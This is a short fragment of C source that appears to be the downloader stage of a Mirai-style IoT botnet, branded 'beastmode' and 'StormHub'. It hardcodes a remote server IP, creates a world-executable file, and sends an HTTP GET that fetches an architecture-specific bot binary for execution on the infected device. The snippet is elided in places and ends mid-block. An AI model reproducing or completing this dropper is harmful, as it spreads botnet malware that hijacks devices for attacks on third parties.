...
#define HTTP_SERVER utils_inet_addr(107,173,222,123) //ip: 127,0,0,1

#define EXEC_MSG            "DaNk BoAtNeTs At StormHub\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "beastmde\n"
...
inline void run(void)
{
    ...
    ffd = open("beastmde", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /beastmode/b3astmode." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
